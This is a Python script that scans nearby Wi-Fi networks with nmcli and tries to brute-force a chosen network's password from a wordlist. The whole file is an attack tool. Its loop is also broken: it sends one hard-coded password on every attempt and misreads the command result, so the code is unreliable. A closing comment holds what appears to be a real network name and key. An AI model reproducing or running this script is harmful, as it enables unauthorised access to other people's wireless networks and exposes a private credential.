import subprocess
from time import sleep
import os
##### VARS #####
ssid_list = []
security_list = []

##### FUNCTIONS #####
def find_networks():
    global ssid_list
    global security_list
    tmp = subprocess.run(["nmcli", "-f", "SSID", "dev", "wifi"], capture_output=True, text=True).stdout
    ssids = tmp.split("\n")
    tmp = subprocess.run(["nmcli", "-f", "SECURITY", "dev", "wifi"], capture_output=True, text=True).stdout
    security = tmp.split("\n")
    del ssids[0]
    del security[0]
    del ssids[-1]
    del security[-1]
    for i in range(len(ssids)):
        ssids[i] = ssids[i].strip()
        security[i] = security[i].strip()
    print(ssids)
    print(security)
    ssid_list = ssids
    security_list = security

def bruteforce(ssid, password=""):
    if password == "":
        with open('resources/passwordlist.txt', 'r') as f:
            codes = f.read().split('\n')
        correct = False
        correct_code = ""
        try:
            for i in range(len(codes)):
                try:
                    result = subprocess.run(["sudo", "nmcli", "dev", "wifi", "connect", ssid, "password", "38969973"], stdout=subprocess.PIPE)
                    print(result)
                    if ("Error:" in result):
                        print(f"password {i} is incorrect")
                    else:
                        correct = True
                        correct_code = codes[i]
                        print(f"The password of {ssid} is {correct_code}")
                        break
                except:
                    print("erre")
        except:
            print("Error occured in bruteforcing")
        finally:
            print("Ending bruteforce")
            if correct:
                print(f"The password of {ssid} is {correct_code}")

print("STARTED")

find_networks()
print("enter the number following the network ssid to select")
for i in range(len(ssid_list)):
    print(f"> {ssid_list[i]} < ({i})")
selected_network = int(input("Enter number here: "))
bruteforce(ssid_list[selected_network])
# nmcli connection add type wifi ifname wlp2s0 ssid H con-name PRATAP2 +802-11-wireless-security.key-mgmt WPA-PSK +802-11-wireless-security.psk 50251919
